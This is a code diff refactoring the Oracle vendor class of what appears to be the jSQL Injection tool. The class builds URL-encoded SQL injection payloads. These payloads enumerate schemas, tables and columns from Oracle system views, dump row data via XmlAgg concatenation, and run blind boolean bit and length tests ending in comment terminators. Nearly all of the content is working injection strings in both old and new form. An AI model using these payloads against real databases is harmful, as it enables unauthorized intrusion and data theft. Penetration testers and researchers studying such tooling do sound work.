@@ -1,5 +1,10 @@
 package com.jsql.model.injection.vendor;
 
+import static com.jsql.model.accessible.DataAccess.QTE_SQL;
+import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
+import static com.jsql.model.accessible.DataAccess.TD_SQL;
+import static com.jsql.model.accessible.DataAccess.TRAIL_SQL;
+
 import java.util.ArrayList;
 import java.util.List;
 
@@ -9,11 +14,11 @@ import com.jsql.model.bean.database.Table;
 import com.jsql.model.injection.strategy.Strategy;
 import com.jsql.util.StringUtil;
 
-public class OracleVendor extends AbstractVendor {
+public class OracleVendor extends AbstractVendorDefault {
 
     @Override
     public String getSqlInfos() {
-        return "SELECT+version||'%04'||SYS.DATABASE_NAME||'%04'||user||'%01%03%03%07'FROM+v%24instance";
+        return "SELECT+version||'"+ SEPARATOR_SQL +"'||SYS.DATABASE_NAME||'"+ SEPARATOR_SQL +"'||user||'"+ TRAIL_SQL +"'FROM+v%24instance";
     }
 
     @Override
@@ -23,10 +28,10 @@ public class OracleVendor extends AbstractVendor {
                 "utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(replace(" +
                     "replace(" +
                         "XmlAgg(" +
-                            "XmlElement(\"a\",rawtohex('%04'||s||'%050%04'))order+by+s+nulls+last" +
+                            "XmlElement(\"a\",rawtohex('"+ SEPARATOR_SQL +"'||s||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'))order+by+s+nulls+last" +
                         ").getClobVal()," +
                     "'<a>','')," +
-                "'<%2Fa>',rawtohex('%06'))||rawtohex('%01%03%03%07'),4000,1)AS+VARCHAR(1024)))" +
+                "'<%2Fa>',rawtohex('"+ TD_SQL +"'))||rawtohex('"+ TRAIL_SQL +"'),4000,1)AS+VARCHAR(1024)))" +
                 "+from(" +
                     "select+t.s+from(SELECT+DISTINCT+owner+s+"+
                         "FROM+all_tables+"+
@@ -46,10 +51,10 @@ public class OracleVendor extends AbstractVendor {
                 "utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(replace(" +
                     "replace(" +
                         "XmlAgg(" +
-                            "XmlElement(\"a\",rawtohex('%04'||s||'%050%04'))order+by+s+nulls+last" +
+                            "XmlElement(\"a\",rawtohex('"+ SEPARATOR_SQL +"'||s||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'))order+by+s+nulls+last" +
                         ").getClobVal()," +
                     "'<a>','')," +
-                "'<%2Fa>',rawtohex('%06'))||rawtohex('%01%03%03%07'),4000,1)AS+VARCHAR(1024)))" +
+                "'<%2Fa>',rawtohex('"+ TD_SQL +"'))||rawtohex('"+ TRAIL_SQL +"'),4000,1)AS+VARCHAR(1024)))" +
                 "+from(select+t.s+from(SELECT+DISTINCT+table_name+s+"+
                     "FROM+all_tables+where+owner='" + database + "'+"+
                     ")t,(SELECT+DISTINCT+table_name+s+"+
@@ -67,10 +72,10 @@ public class OracleVendor extends AbstractVendor {
             "utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(replace(" +
                 "replace(" +
                     "XmlAgg(" +
-                        "XmlElement(\"a\",rawtohex('%04'||s||'%050%04'))order+by+s+nulls+last" +
+                        "XmlElement(\"a\",rawtohex('"+ SEPARATOR_SQL +"'||s||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'))order+by+s+nulls+last" +
                     ").getClobVal()," +
                 "'<a>','')," +
-            "'<%2Fa>',rawtohex('%06'))||rawtohex('%01%03%03%07'),4000,1)AS+VARCHAR(1024)))" +
+            "'<%2Fa>',rawtohex('"+ TD_SQL +"'))||rawtohex('"+ TRAIL_SQL +"'),4000,1)AS+VARCHAR(1024)))" +
             "+from(select+t.s+from(SELECT+DISTINCT+column_name+s+"+
                 "FROM+all_tab_columns+where+owner='" + table.getParent() + "'and+table_name='" + table + "'"+
                 ")t,(SELECT+DISTINCT+column_name+s+"+
@@ -92,10 +97,10 @@ public class OracleVendor extends AbstractVendor {
             "utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(replace(" +
                 "replace(" +
                     "XmlAgg(" +
-                        "XmlElement(\"a\",rawtohex('%04'||s||'%050%04'))order+by+s+nulls+last" +
+                        "XmlElement(\"a\",rawtohex('"+ SEPARATOR_SQL +"'||s||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'))order+by+s+nulls+last" +
                     ").getClobVal()," +
                 "'<a>','')," +
-            "'<%2Fa>',rawtohex('%06'))||rawtohex('%01%03%03%07'),4000,1)AS+VARCHAR(1024)))" +
+            "'<%2Fa>',rawtohex('"+ TD_SQL +"'))||rawtohex('"+ TRAIL_SQL +"'),4000,1)AS+VARCHAR(1024)))" +
             "+from(select+t.s+from(SELECT+DISTINCT+" + formatListColumn + "+s+"+
                 "FROM+" + database + "." + table + ""+
                 ")t,(SELECT+DISTINCT+" + formatListColumn + "+s+"+
@@ -117,27 +122,27 @@ public class OracleVendor extends AbstractVendor {
     }
 
     @Override
-    public String getSqlBlindFirstTest() {
+    public String sqlTestBlindFirst() {
         return "0%2b1=1";
     }
 
     @Override
-    public String getSqlBlindCheck(String check) {
+    public String sqlTestBlind(String check) {
         return "+and+" + check + "--+";
     }
 
     @Override
-    public String getSqlBlindBitCheck(String inj, int indexCharacter, int bit) {
+    public String sqlBitTestBlind(String inj, int indexCharacter, int bit) {
         return "+and+0!=BITAND(ascii(substr(" + inj + "," + indexCharacter + ",1))," + bit + ")--+";
     }
 
     @Override
-    public String getSqlBlindLengthCheck(String inj, int indexCharacter) {
+    public String sqlLengthTestBlind(String inj, int indexCharacter) {
         return "+and+length(" + inj + ")>" + indexCharacter + "--+";
     }
 
     @Override
-    public String getSqlBlind(String sqlQuery, String startPosition) {
+    public String sqlBlind(String sqlQuery, String startPosition) {
         return
             "(" +
                 "select+" +
